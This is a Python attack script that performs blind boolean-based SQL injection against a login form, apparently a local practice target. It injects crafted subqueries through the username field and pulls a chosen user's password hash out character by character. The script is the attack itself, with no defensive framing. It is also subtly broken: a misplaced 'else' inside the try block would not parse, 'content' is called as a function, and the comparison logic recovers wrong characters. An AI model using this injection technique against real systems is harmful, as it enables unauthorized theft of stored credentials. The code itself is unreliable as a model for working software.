import requests

total_queries = 0
charset = "0123456789abcdef" #data format that is stored in hex
target = "http://127.0.0.1:5000"
needle = "Welcome back"

#send query to the app and identify from response if request was valid or not
def injected_query(payload):
	global total_queries
	r = requests.post(target, data = {"username" : "admin and {}--".format(payload), "password" : "password"})
	total_queries += 1
	return needle.encode() not in r.content()

#create boolean query which identifies as a certain offset if a character is valid or not
def boolean_query(offset, user_id, character, operator=">"):
	payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(offset+1, user_id, operator, character)
	return injected_query(payload)

#check if user_id is valid
def invalid_user(user_id):
	payload = "(select id from user where id = {}) >= 0".format(user_id)
	return injected_query(payload)

#check for length of user's password
def password_length(user_id):
	i = 0
	while True:
		payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
		if not injected_query(payload):
			return i
		i += 1

#extract hash of password based of the character set provided, their id and the length of the user's pass
def extract_hash(charset, user_id, password_length):
	found = ""
	for i in range(0, password_length):
		for j in range(len(charset)):
			if boolean_query(i, user_id, charset[j]):
				found += charset[j]
				break
	return found

#total queries
def total_queries_taken():
	global total_queries
	print("\t\t[!] {} total queries!".format(total_queries))
	total_queries = 0


while True:
	try:
		user_id = input("> Enter a user ID to extract the password hash: ")
		if not invalid_user(user_id):
			user_password_length = password_length(user_id)
			print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
			total_queries_taken()
			print("\t[-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id), user_password_length)))
			total_queries_taken()
	else:
		print("\t[X] User {} does not exist!".format(user_id))
	except KeyboardInterrupt:
		break
